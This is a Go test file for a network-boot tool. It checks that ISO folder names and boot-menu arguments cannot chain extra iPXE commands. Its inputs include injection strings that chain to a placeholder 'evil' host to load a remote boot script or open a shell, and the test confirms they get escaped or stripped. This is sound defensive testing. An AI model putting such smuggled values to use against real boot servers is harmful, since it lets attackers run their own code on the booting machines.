package family

import (
	"strings"
	"testing"

	"github.com/ghazichaieb/gola-bootlace/internal/ipxesafe"
)

// What an ISO holds (the names of its folders, the arguments of its own boot menu) must not be able to start another iPXE command: a start is `kernel`, `initrd` and `boot`, whatever the ISO
// calls its files.
func TestAnIsoCannotChainCommandsThroughItsFileNamesOrItsMenuArguments(t *testing.T) {
	base := "http://server:8080/fs/abc"
	b := newBoot("Test", files{base, "/casper && chain http://evil/boot.ipxe ;/vmlinuz", "/boot dir/initrd || shell"}, "quiet && chain http://evil/x ; splash ||  ${net0/mac} boot=casper")
	if len(b.Commands) != 3 || b.Commands[2] != "boot" {
		t.Fatalf("the start is not kernel, initrd, boot: %q", b.Commands)
	}
	for _, c := range b.Commands {
		for _, w := range strings.Fields(c) {
			if ipxesafe.Terminator(w) {
				t.Errorf("%q has the chaining word %q", c, w)
			}
		}
		if strings.Contains(c, "${") {
			t.Errorf("%q holds an expansion", c)
		}
	}
	kernel := strings.Fields(b.Commands[0])
	if kernel[0] != "kernel" || kernel[1] != base+"/casper%20&&%20chain%20http://evil/boot.ipxe%20;/vmlinuz" {
		t.Errorf("the path is not escaped into one word: %q", kernel[:2])
	}
	if !strings.HasSuffix(b.Commands[0], " quiet chain http://evil/x splash $ {net0/mac} boot=casper") {
		t.Errorf("the arguments are not cleaned: %q", b.Commands[0])
	}
	if got := strings.Fields(b.Commands[1]); len(got) != 2 || got[1] != base+"/boot%20dir/initrd%20%7C%7C%20shell" && got[1] != base+"/boot%20dir/initrd%20||%20shell" {
		t.Errorf("the start-up disk path is not one word: %q", b.Commands[1])
	}
}

func TestOrdinaryPathsAndArgumentsAreLeftAlone(t *testing.T) {
	b := newBoot("Test", files{"http://s/fs/x", "/casper/vmlinuz", "/casper/initrd"}, "boot=casper quiet splash ds=nocloud-net;s=http://s/answers/id/")
	if b.Commands[0] != "kernel http://s/fs/x/casper/vmlinuz boot=casper quiet splash ds=nocloud-net;s=http://s/answers/id/" || b.Commands[1] != "initrd http://s/fs/x/casper/initrd" {
		t.Errorf("%q", b.Commands)
	}
}
